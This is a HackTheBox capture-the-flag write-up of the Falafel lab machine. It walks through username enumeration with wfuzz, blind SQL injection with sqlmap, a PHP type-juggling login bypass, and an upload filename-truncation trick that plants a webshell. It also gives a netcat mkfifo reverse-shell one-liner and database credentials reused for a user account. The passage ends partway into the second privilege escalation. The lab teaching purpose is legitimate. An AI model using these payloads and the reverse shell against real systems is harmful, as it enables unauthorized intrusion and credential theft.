---
title: HTB: Falafel
url: https://0xdf.gitlab.io/2018/06/23/htb-falafel.html
date: 2018-06-23T15:45:10+00:00
difficulty: Hard [40]
os: Linux
tags: hackthebox, htb-falafel, ctf, wfuzz, sqlmap, sqli, type-juggling, php, upload, webshell, framebuffer, dev-fb0, debugfs, oswe-like, oscp-plus-v1
---

Falafel is one of the best put together boxes on HTB. The author does a great job of creating a path with lots of technical challenges that are both not that hard and require a good deal of learning and understanding what’s going on. And there are hints distributed to us along the way.

## Box Info

| Name | [Falafel](https://hackthebox.com/machines/falafel)  [Falafel](https://hackthebox.com/machines/falafel) [Play on HackTheBox](https://hackthebox.com/machines/falafel) |
| --- | --- |
| Release Date | 03 Feb 2018 |
| Retire Date | 04 May 2024 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Falafel |
| Radar Graph | Radar chart for Falafel |
| First Blood User | 03:14:29[Geluchat Geluchat](https://app.hackthebox.com/users/14962) |
| First Blood Root | 23:17:32[Geluchat Geluchat](https://app.hackthebox.com/users/14962) |
| Creators | [dm0n dm0n](https://app.hackthebox.com/users/2508)  [Stylish Stylish](https://app.hackthebox.com/users/10841) |

## nmap

As always, get started with an `nmap` scan of the box. http and ssh are open:

```

root@kali# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.73
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-13 05:43 EDT
Nmap scan report for 10.10.10.73
Host is up (0.10s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.76 seconds

root@kali# nmap -sC -sV -p 80,22 -oA nmap/scripts 10.10.10.73
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-13 05:47 EDT
Nmap scan report for 10.10.10.73
Host is up (0.094s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 36:c0:0a:26:43:f8:ce:a8:2c:0d:19:21:10:a6:a8:e7 (RSA)
|   256 cb:20:fd:ff:a8:80:f2:a2:4b:2b:bb:e1:76:98:d0:fb (ECDSA)
|_  256 c4:79:2b:b6:a9:b7:17:4c:07:40:f3:e5:7c:1a:e9:dd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/*.txt
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Falafel Lovers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.18 seconds

```

There’s also a `robots.txt` file with a disallow entry for “\*.txt”. That’s a hint to include that in a `gobuster` run (though I always include .txt anyway).

## Port 80 - http site

There’s a page for FalafeLoves, with a home and a login button:

![1526204786239](https://0xdfimages.gitlab.io/img/1526204786239.png)

The login link leads to `http://10.10.10.73/login.php`:

![1526204805690](https://0xdfimages.gitlab.io/img/1526204805690.png)

### gobuster

Having seen both the `robots.txt` and the `login.php` page, let’s start more enumeration looking for `.txt`, `.php`, and `.html`:

```

root@kali# gobuster -u http://10.10.10.73 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 30

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.73/
[+] Threads      : 30
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
[+] Extensions   : .txt,.php,.html
=====================================================
/images (Status: 301)
/login.php (Status: 200)
/profile.php (Status: 302)
/index.php (Status: 200)
/uploads (Status: 301)
/header.php (Status: 200)
/assets (Status: 301)
/footer.php (Status: 200)
/upload.php (Status: 302)
/css (Status: 301)
/style.php (Status: 200)
/js (Status: 301)
/logout.php (Status: 302)
/robots.txt (Status: 200)
/cyberlaw.txt (Status: 200)
/connection.php (Status: 200)
=====================================================

```

Most interesting is the discovery of `cyberlaw.txt`:

```

From: Falafel Network Admin (admin@falafel.htb)
Subject: URGENT!! MALICIOUS SITE TAKE OVER!
Date: November 25, 2017 3:30:58 PM PDT
To: lawyers@falafel.htb, devs@falafel.htb
Delivery-Date: Tue, 25 Nov 2017 15:31:01 -0700
Mime-Version: 1.0
X-Spam-Status: score=3.7 tests=DNS_FROM_RFC_POST, HTML_00_10, HTML_MESSAGE, HTML_SHORT_LENGTH version=3.1.7
X-Spam-Level: ***

A user named "chris" has informed me that he could log into MY account without knowing the password,
then take FULL CONTROL of the website using the image upload feature.
We got a cyber protection on the login form, and a senior php developer worked on filtering the URL of the upload,
so I have no idea how he did it.

Dear lawyers, please handle him. I believe Cyberlaw is on our side.
Dear develpors, fix this broken site ASAP.

	~admin

```

This lays out a path to code exec. It also hints at a user named “chris”.

### Website Access - Chris

#### Username Discovery - wfuzz

When you submit an incorrect username and password, the site responds with “try again”:

![1526205500190](https://0xdfimages.gitlab.io/img/1526205500190.png)

However, when you submit an incorrect password with username `admin`, it says “Wrong identification: admin”:

![1526205540296](https://0xdfimages.gitlab.io/img/1526205540296.png)

This suggests that we can confirm valid user names based on the changing message. We’ll use `wfuzz`. We can see in burp that logging in submits a POST to /login.php, with post fields “username” and “password”. We’ll start with `wfuzz -c -w /opt/SecLists/Usernames/Names/names.txt -d "username=FUZZ&password=abcd" -u http://10.10.10.73/login.php`, where `-c` is for colored output, `-w` specifies a wordlist (in this case from [Daniel Miessler’s SecLists](https://github.com/danielmiessler/SecLists)), `-d` is the post data, where `FUZZ` is what `wfuzz` will replace with items from the wordlist, and `-u` is the url.

```

root@kali# wfuzz -c -w /opt/SecLists/Usernames/Names/names.txt -d "username=FUZZ&password=abcd" -u http:
//10.10.10.73/login.php
********************************************************
* Wfuzz 2.2.9 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.73/login.php
Total requests: 10163

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000001:  C=200    102 L      657 W         7074 Ch        "aaliyah"
000002:  C=200    102 L      657 W         7074 Ch        "aaren"
000004:  C=200    102 L      657 W         7074 Ch        "aaron"
000041:  C=200    102 L      657 W         7074 Ch        "achal"
000042:  C=200    102 L      657 W         7074 Ch        "achamma"
^C
Finishing pending requests...

```

Now that we see that a non-existent username returns a response that’s 7074 characters, let’s exclude that result, using the `--hh 7074`:

```

root@kali# wfuzz -c -w /opt/SecLists/Usernames/Names/names.txt -d "username=FUZZ&password=abcd" -u http://10.10.10.73/login.php --hh 7074
********************************************************
* Wfuzz 2.2.9 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.73/login.php
Total requests: 10163

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000086:  C=200    102 L      659 W         7091 Ch        "admin"
001883:  C=200    102 L      659 W         7091 Ch        "chris"

Total time: 328.8529
Processed Requests: 10163
Filtered Requests: 10161
Requests/sec.: 30.90438

```

So we confirmed two accounts, admin and chris.

#### SQL Injection - sqlmap

##### basic sqlmap

Getting `sqlmap` to find this took a bit of work. When I was first doing this box, I got it to work somehow using the `--tamper-data` but I both couldn’t repeat that, and don’t really understand why it worked. What we can do is use the fact that we have a field in username that changes based on if the username is good to do blind injection. That is done with the `--string` option.

First, grab a request from burp, which we’ll save using the `copy to file` option:

```

root@kali# cat login-chris.request
POST /login.php HTTP/1.1
Host: 10.10.10.73
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.73/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Cookie: PHPSESSID=g9kp8du6ofpc7g8m5d81nt2c00
Connection: close
Upgrade-Insecure-Requests: 1

username=chris&password=chris

```

I started with the following command: `sqlmap -r login-chris.request --level 5 --risk 3 --batch`, but it didn’t result in any hits. At the end of a failed run it returns this message:

```

[22:18:32] [CRITICAL] all tested parameters do not appear to be injectable. Also, you can try to rerun by providing a valid value for option '--string' as perhaps the string you have chosen does not match exclusively True responses. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')

```

#### sqlmap –string

To test a blind injection, we can look for output on the page that changes based on our input. We know the username field gives us “Try again” when the name doesn’t exist, and “Wrong identification : admin” when the name does. If you check out the man pages for `sqlmap`, the `--string` option says “–string=STRING String to match when query is evaluated to True”. There’s also a `--not-string`, which is when the query is false.

Because it’s clear that the site is first doing a query with just the username, to see if it exists, before checking the password, that returns true is the username exists. So if there username field is injectable, then we can tell `sqlmap` to check that using the `--string` option.

```

root@kali# sqlmap -r login-chris.request --level 5 --risk 3 --batch --string "Wrong identification"
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.5#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

...
[08:25:48] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
...
[08:26:26] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 301 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=chris' AND 8059=8059-- GlxT&password=chris
---
[08:26:31] [INFO] testing MySQL
[08:26:31] [INFO] confirming MySQL
[08:26:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.0
[08:26:31] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.73'

```

Got it! Let’s now dump the database:

```

root@kali# sqlmap -r login-chris.request --level 5 --risk 3 --batch --string "Wrong identification" --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.5#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org
...
08:31:30] [INFO] testing if the provided string is within the target URL page content
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=chris' AND 8059=8059-- GlxT&password=chris
---
[08:31:30] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL 5
...
[08:31:30] [INFO] retrieved: falafel
[08:31:39] [INFO] fetching tables for database: 'falafel'
[08:31:39] [INFO] fetching number of tables for database 'falafel'
[08:31:39] [INFO] retrieved: 1
[08:31:39] [INFO] retrieved: users
[08:31:46] [INFO] fetching columns for table 'users' in database 'falafel'
[08:31:46] [INFO] retrieved: 4
[08:31:48] [INFO] retrieved: ID
[08:31:50] [INFO] retrieved: username
[08:32:02] [INFO] retrieved: password
[08:32:46] [WARNING] turning off pre-connect mechanism because of connection time out(s)
[08:32:46] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
d
[08:33:03] [INFO] retrieved: role
[08:33:10] [INFO] fetching entries for table 'users' in database 'falafel'
[08:33:10] [INFO] fetching number of entries for table 'users' in database 'falafel'
[08:33:10] [INFO] retrieved: 2
[08:33:11] [INFO] retrieved: 1
[08:33:30] [INFO] retrieved: 0e462096931906507119562988736854
[08:34:40] [INFO] retrieved: admin
[08:34:51] [INFO] retrieved: admin
[08:35:06] [INFO] retrieved: 2
[08:35:08] [INFO] retrieved: d4ee02a22fc872e36d9e3751ba72ddc8
[08:36:30] [INFO] retrieved: normal
[08:36:43] [INFO] retrieved: chris
[08:36:52] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[08:36:52] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/txt/wordlist.zip' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[08:36:52] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[08:36:52] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[08:36:52] [INFO] starting 4 processes
[08:36:54] [INFO] cracked password 'juggling' for user 'chris'
Database: falafel
Table: users
[2 entries]
+----+--------+----------+---------------------------------------------+
| ID | role   | username | password                                    |
+----+--------+----------+---------------------------------------------+
| 1  | admin  | admin    | 0e462096931906507119562988736854            |
| 2  | normal | chris    | d4ee02a22fc872e36d9e3751ba72ddc8 (juggling) |
+----+--------+----------+---------------------------------------------+

[08:36:56] [INFO] table 'falafel.users' dumped to CSV file '/root/.sqlmap/output/10.10.10.73/dump/falafel/users.csv'
[08:36:56] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.73'

[*] shutting down at 08:36:56

```

##### sqli - what’s going on

So why did that work? Because there’s a different response for wrong password with existing username and wrong password with non-existing username, there is likely a query using just username to the database. With that binary feedback, we can do a blind sql injection, where we don’t get to see the results of the query, but we can ask yes or no questions of the database.

I guess that it looks something like `select * from users where username = '$_POST["username"]'`, and then it checks if there are rows returned. If rows, then check the password (either with another query to the db, or by looking at the data that came back from the username query), and return the
bad password message if it’s wrong, and if no rows, then return the bad username message. (It turns out that the source confirms that’s almost exactly right.)

Since we only get back a true or false, we’ll make use of the `sql` function `substring`, which takes a field name, a starting character (first char is 1, not 0), and a length. So if we set username to be `admin' and substring(password, 1, 1) = '0' -- -`, then we get a true or false as to if the password hash starts with 0. Combining that with our guessed query, it works out to: `select * from users where username = 'admin' and substring(password, 1, 1) = '0' -- '`

Since there are only 16 possible characters in the hash, it’s not hard to brute force over the character set and get the hash back.

[ippsec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA) does both the `sqlmap` and manaual sqli in his falafel video this week. It’s definitely worth a watch (like every one of his videos), especially if you are’t clear on this, or want to see if presented differently.

#### hash cracking

`sqlmap already broke Chris’ password for us. I tried hashcat to see if the admin password is brute-force-able, and it’s not, at least with rockyou (though chris’ password is confirmed):

```

root@kali# hashcat -a 0 -m 0 sql-md5.hashes /usr/share/wordlists/rockyou.txt --force --outfile sql-md5.cracked
...
root@kali# cat sql-md5.cracked
d4ee02a22fc872e36d9e3751ba72ddc8:juggling

```

It turns out that since I did the challenge, someone decided to spoil it by posting the admin hash and it’s password on pastebin, so googling for the hash gives the password, and allows you to skip the next part. But that’s no fun, so we’re going to ignore that here.

#### Access as chris

Logging in as chris gives his profile:

![1526472801488](https://0xdfimages.gitlab.io/img/1526472801488.png)

There’s a lot of references to juggling, which is a hint to think about php type juggling.

### Website Access - admin

#### php type juggling intro

php type juggling is where php tries to resolve an equality by making assumptions about the variable types. For example, php will try to convert a string to a number by taking any initial digits, and ignoring the rest. It will also treat a string that starts with a character as 0, and a string that starts with numbers then e as an exponential:

```

php > if ("3afa2c1fb515c53a3349c7f8d619abc8" == 4) { echo "equal"; } else { echo "not equal"; } // 3 != 4
not equal
php > if ("3afa2c1fb515c53a3349c7f8d619abc8" == 4) { echo "equal"; } else { echo "not equal"; } // 3 != 4
not equal
php > if ("3afa2c1fb515c53a3349c7f8d619abc8" == 3) { echo "equal"; } else { echo "not equal"; } // 3 == 3
equal
php > if ("aafa2c1fb515c53a3349c7f8d619abc8" == 0) { echo "equal"; } else { echo "not equal"; } // 0 == 0
equal

```

You can fix this by using the `===` operator in php:

```

php > if ("aafa2c1fb515c53a3349c7f8d619abc8" === 0) { echo "equal"; } else { echo "not equal"; }
not equal

```

Some good juggling references:
- [Overview Presentation by Chris Smith](https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf)
- [Good Cheat Sheet](https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/)
- [San’s Blog](https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing)
- [Magic Hashes](https://web.archive.org/web/20220118182443/https://www.whitehatsec.com/blog/magic-hashes/) (now via wayback machine as the original link is dead)

#### Juggle admin’s Password

Armed with the hint to think about type juggling, I tried a few things to get into the site.

This is going to work, as we already have the hash of the admin password from `sqlmap`, and it starts with `0e`, `0e462096931906507119562988736854`.

The Magic Hashes reference above gives a string for many different hash types that works out to start with `0e`. Trying these, the `md5` one, `240610708` logs in:

![1526345220190](https://0xdfimages.gitlab.io/img/1526345220190.png)

### Code Execution - Webshell

#### File Upload Overview / Failures

The admin user has access to additional functionality, `/upload.php`. The `/upload.php` path takes a url for an image. When a valid image url is give, it outputs the following:

![upload](https://0xdfimages.gitlab.io/img/upload.png)

If you try to upload something ending in a non-image extension, you get:

![1526345623560](https://0xdfimages.gitlab.io/img/1526345623560.png)

Fails:
- `http://10.10.15.99:8081/cmd.php'; echo png #` - error, no upload
- `http://10.10.15.99:8081/cmd.php';test.png` - full string at http server
- `http://10.10.15.99:8081/cmd.php;.jpg` - gets file, but only full path is accessible
- `http://10.10.15.99:8081/cmd.php%00.jpg` - GET request makes it to server, but error there
- Extension filter not done client side - catching request and modifying doesn’t bypass
- `http://10.10.15.99:8081/cmd.php%27%3b%20echo%20test%23.png` - request for full url
- `http://10.10.15.99:8081/cmd.php #.png`- invalid url
- `http://10.10.10.15.99:8081/cmd.php%27%3btest.png` - http server gets encoded chars in request

#### File Upload Success - File name truncation

The admin’s profile page has a quote, which is actually a hint:

![1526574356091](https://0xdfimages.gitlab.io/img/1526574356091.png)

As far as limits, when submitting an absurdly long name into the system, the message is a bit different:

![1526400260532](https://0xdfimages.gitlab.io/img/1526400260532.png)

So what is the longest acceptable length?

```

root@kali# URL=$(python -c 'print "http://10.10.15.99:8081/" + "A"*228 + "test.png"'); curl -i -s -k  -X $'POST'     -H $'Referer: http://10.10.10.73/upload.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Cookie: PHPSESSID=g9kp8du6ofpc7g8m5d81nt2c00'     --data-binary "url=$URL" $'http://10.10.10.73/upload.php' | grep "The name is too long"

root@kali# URL=$(python -c 'print "http://10.10.15.99:8081/" + "A"*229 + "test.png"'); curl -i -s -k  -X $'POST'     -H $'Referer: http://10.10.10.73/upload.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Cookie: PHPSESSID=g9kp8du6ofpc7g8m5d81nt2c00'     --data-binary "url=$URL" $'http://10.10.10.73/upload.php' | grep "The name is too long"
        <pre>The name is too long, 237 chars total.

```

At 237 characters, the full file is still requested at http server:

```
10.10.10.73 - - [15/May/2018 12:22:50] code 404, message File not found
10.10.10.73 - - [15/May/2018 12:22:50] "GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest.png HTTP/1.1" 404 -

```

Looking in more detail at the output from 237 character file name:

```

root@kali# URL=$(python -c 'print "http://10.10.15.99:8081/" + "A"*229 + "test.png"'); curl -i -s -k  -X $'POST'     -H $'Referer: http://10.10.10.73/upload.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Cookie: PHPSESSID=g9kp8du6ofpc7g8m5d81nt2c00'     --data-binary "url=$URL" $'http://10.10.10.73/upload.php' | grep -e "The name is too long" -e shorten -e "New name"
        <pre>The name is too long, 237 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest.pn.

```

The new name is no longer a png file.

So upload a php webshell that ends in `.php.png` that is just long enough that the last four characters get truncated:

```

root@kali# URL=$(python -c 'print "http://10.10.15.99:8081/" + "A"*232 + ".php.png"'); curl -i -s -k  -X $'POST'     -H $'Referer: http://10.10.10.73/upload.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Cookie: PHPSESSID=g9kp8du6ofpc7g8m5d81nt2c00'     --data-binary "url=$URL" $'http://10.10.10.73/upload.php' | grep -e "The name is too long" -e shorten -e "New name" -e CMD
        <pre>CMD: cd /var/www/html/uploads/0515-1930_45ed3e0a6a8c22db; wget 'http://10.10.15.99:8081/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png'</pre>
        <pre>The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.

```

Test the shell:

```

root@kali# curl http://10.10.10.73/uploads/0515-1930_45ed3e0a6a8c22db/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Webshell –> Shell

I was able to get an interactive shell on Falafel using the nc / pipe backdoor, `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f`. As I like to script these things, I write a python script to generate a callback, which is included at the end of this post.

## privesc: www-data -> moshe

There are two users with home directories on the box:

```

www-data@falafel:/var/www/html$ ls /home
moshe  yossi

```

In the site php files, there’s creds for the database.

```

www-data@falafel:/var/www/html$ cat connection.php
<?php
   define('DB_SERVER', 'localhost:3306');
   define('DB_USERNAME', 'moshe');
   define('DB_PASSWORD', 'falafelIsReallyTasty');
   define('DB_DATABASE', 'falafel');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
   // Check connection
   if (mysqli_connect_errno())
   {
      echo "Failed to connect to MySQL: " . mysqli_connect_error();
   }
?>

```

It happens that the password is also moshe’s:

```

www-data@falafel:/var/www/html$ su moshe
Password:
moshe@falafel:/var/www/html$

```

And user.txt is in moshe’s home dir:

```

moshe@falafel:~$ wc -c user.txt
33 user.txt
moshe@falafel:~$ cat user.txt
c866575e...

```

ssh now allows us to ssh in as moshe as well.

## privesc: moshe -> yossi

### fails

I tried a lot of conventional ways to get escalation on this host, all of which failed. Some things included:
- sql db, only has users table, and I already got it with `sqlmap`
- Other files in uploads doesn’t show anything interesting

  ```

  www-data@falafel:/var/www/html/uploads$ find . -type f | cut -d'/' -f3 | sort | uniq -c | sort -nr
      275 4.jpg
        3 rev.shell.php.jpg
        3 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.php
        3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php
        2 omgaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php
        2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png
        1 omg.jpg
        1 index.jpg
        1 file.jpg
        1 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php
        1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB.php
        1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.p
        1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.jpg
        1 3.jpg

  ```
- No sudo
- No interesting setuid binaries

  ```

  moshe@falafel:~$ # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
  moshe@falafel:~$ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
  -rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec
  -rwsr-xr-x 1 root root 49584 May 17  2017 /usr/bin/chfn
  -rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
  -rwsr-xr-x 1 root root 75304 May 17  2017 /usr/bin/gpasswd
  -rwsr-xr-x 1 root root 39904 May 17  2017 /usr/bin/newgrp
  -rwsr-xr-x 1 root root 54256 May 17  2017 /usr/bin/passwd
  -rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newgidmap
  -rwsr-xr-x 1 root root 40432 May 17  2017 /usr/bin/chsh
  -rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newuidmap
  -rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
  -rwsr-xr-x 1 root root 40152 Jun 15  2017 /bin/mount
  -rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
  -rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
  -rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
  -rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su

  ```

## Success - Screenshot of yossi

We notice that yossi is physically logged into the host:

```

moshe@falafel:~$ w
 16:18:31 up  9:16,  2 users,  load average: 0.95, 0.73, 0.56
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      07:02    9:16m  0.16s  0.10s -bash
moshe    pts/0    10.10.14.159     16:17    0.00s  0.11s  0.02s w

```

If we look at the groups that we’re in, there’s some unusual ones:

```

